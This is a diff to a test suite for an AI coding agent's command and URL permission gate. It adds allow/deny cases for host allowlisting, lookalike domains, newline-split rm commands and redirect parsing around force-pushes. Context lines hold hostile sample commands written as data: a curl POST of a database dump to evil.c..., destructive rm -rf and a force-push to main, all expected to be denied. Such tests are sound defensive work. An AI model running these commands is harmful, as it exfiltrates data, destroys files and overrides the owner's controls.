@@ -102,6 +102,44 @@ case("gh pr create carrying the Claude Code attribution link",
           'Generated with [Claude Code](https://claude.com/claude-code)"'), ALLOW)
 case("claude.com read", fetch("https://claude.com/claude-code"), ALLOW)
 
+# Dot relay's Slack Web API is fixed infrastructure; unknown hosts stay denied.
+case("bash curl to the Slack Web API is allowed",
+     bash("curl https://slack.com/api/auth.test"), ALLOW)
+case("bash curl to an unrelated unknown API host is still blocked",
+     bash("curl https://unlisted-api-host.example/api/auth.test"), DENY)
+
+# DoctorCRE's production app is a fixed CARR-owned domain. Its gated board
+# route must be reachable for a live, unauthenticated sign-in check.
+case("DoctorCRE app production route is allowed",
+     bash("curl -sS -D - -o /dev/null https://app.doctorcre.com/progress-board"), ALLOW)
+case("DoctorCRE app subdomain is blocked",
+     bash("curl https://x.app.doctorcre.com/progress-board"), DENY)
+case("DoctorCRE app prefix lookalike is blocked",
+     bash("curl https://myapp.doctorcre.com/progress-board"), DENY)
+case("DoctorCRE app lookalike remains blocked",
+     bash("curl https://app.doctorcre.com.evil.example/progress-board"), DENY)
+case("DoctorCRE app trailing-dot variant is allowed",
+     bash("curl https://app.doctorcre.com./progress-board"), ALLOW)
+case("DoctorCRE app mixed-case trailing-dot variant is allowed",
+     bash("curl https://App.DoctorCRE.Com./progress-board"), ALLOW)
+case("DoctorCRE app double-dot variant is blocked",
+     bash("curl https://app.doctorcre.com../progress-board"), DENY)
+
+# A long WebFetch URL distinguishes the fixed-host list from open-read, whose
+# URL cap would otherwise hide an incorrectly classified app hostname.
+_APP_LONG_QUERY = "/progress-board?d=" + "x" * 300
+case("WebFetch allows the canonical DoctorCRE app host",
+     fetch("https://app.doctorcre.com" + _APP_LONG_QUERY), ALLOW)
+case("WebFetch allows the DoctorCRE app trailing-dot host",
+     fetch("https://app.doctorcre.com." + _APP_LONG_QUERY), ALLOW)
+case("WebFetch allows the DoctorCRE app mixed-case trailing-dot host",
+     fetch("https://App.DoctorCRE.Com." + _APP_LONG_QUERY), ALLOW)
+for _host in ("x.app.doctorcre.com", "x.app.doctorcre.com.",
+              "myapp.doctorcre.com", "app.doctorcre.com.evil.example",
+              "app.doctorcre.com.evil.example.", "app.doctorcre.com.."):
+    case(f"WebFetch denies DoctorCRE app lookalike {_host}",
+         fetch("https://" + _host + _APP_LONG_QUERY), DENY)
+
 # Joe's own private Tailscale tailnet (tailc8cc93.ts.net), added 2026-09-23 so
 # his Mac Studio's local model server ("flash-next") is reachable from his
 # other devices. host_allowlisted does suffix matching, so the one tailnet
@@ -234,6 +272,12 @@ case("bash curl POST to unlisted", bash("curl -X POST -d @db.dump https://evil.c
 case("destructive rm", bash("rm -rf /Users/booko/carr-system/lib"), DENY)
 case("git force push", bash("git push --force origin main"), DENY)
 case("scratch rm is fine", bash("rm -rf /private/tmp/claude-501/x"), ALLOW)
+case("scratch deletion stops at an unquoted newline",
+     bash("rm -f /private/tmp/claude-501/scratch/file\ngit status --short"), ALLOW)
+case("a destructive command after a newline keeps its own targets",
+     bash("rm -f /private/tmp/claude-501/scratch/file\nrm -f /Users/booko/important"), DENY)
+case("a quoted newline is part of an unsafe deletion target",
+     bash("rm -f /private/tmp/claude-501/scratch/file 'unsafe\nfile'"), DENY)
 case("delegation state shell write", bash("echo '{}' > /Users/booko/carr-system/out/delegation-gate-state.json"), DENY)
 case("delegation state read is fine", bash("cat /Users/booko/carr-system/out/delegation-gate-state.json"), ALLOW)
 case("direct Cloudflare deploy is metering-refused", bash("npx wrangler deploy"), DENY)
@@ -449,6 +493,14 @@ case("a redirect to a file does not break the parse",
      bash("git push --force-with-lease origin my-feature > out.log"), ALLOW)
 case("stderr-only redirect does not break the parse",
      bash("git push --force-with-lease origin my-feature 2> err.log"), ALLOW)
+case("multi-digit IO number before a redirect is not a destination",
+     bash("git push --force-with-lease origin my-feature 12> err.log"), ALLOW)
+case("a separate numeric argument before a redirect remains a destination",
+     bash("git push --force-with-lease origin my-feature 2 > err.log"), DENY)
+case("a quoted numeric argument adjacent to a redirect remains a destination",
+     bash("git push --force-with-lease origin my-feature '2'> err.log"), DENY)
+case("an IO number does not hide a protected destination",
+     bash("git push --force-with-lease origin main 12> err.log"), DENY)
 # The same shapes must not become a way to smuggle main past the check.
 case("2>&1 and a pipe do NOT let a push at main through",
      bash("git push --force-with-lease origin main 2>&1 | tail -3"), DENY)
